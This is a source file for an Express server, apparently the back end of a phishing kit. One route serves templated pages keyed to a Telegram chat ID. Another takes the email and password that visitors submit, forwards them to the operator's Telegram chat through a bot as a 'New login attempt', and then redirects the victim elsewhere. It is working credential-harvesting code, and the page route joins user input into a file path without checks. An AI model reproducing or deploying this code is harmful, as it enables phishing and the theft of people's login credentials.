// server/routes/pageRoutes.js
const fs = require('fs');
const path = require('path');
const express = require('express');
const router = express.Router();
const { bot } = require('../serverSetup');
const { users } = require('../connection/db');

// Render pages dynamically
router.get('/:page/:chatId', (req, res) => {
  const { page, chatId } = req.params;
  const viewPath = path.join(__dirname, '../views', `${page}.ejs`);

  if (fs.existsSync(viewPath)) {
    res.render(page, { chatId });
  } else {
    res.status(404).send('Page not found');
  }
});

// Handle form submission
router.post('/submit/:chatId', (req, res) => {
  const chatId = req.params.chatId;
  const { email, pass } = req.body;

  if (users[chatId]) {
    const message = `New login attempt:\n🌐 <b>Username:</b> ${email}\n🔒 <b>Password:</b> ${pass}`;
    bot.sendMessage(chatId, message, { parse_mode: 'HTML' })
      .then(() => res.redirect(users[chatId].userRedirectUrl || 'https://example.com'))
      .catch((error) => {
        console.error('Error sending message to Telegram:', error);
        res.status(500).send('Error sending message to Telegram');
      });
  } else {
    res.status(400).send('Incorrect Submitted Data.');
  }
});

module.exports = router;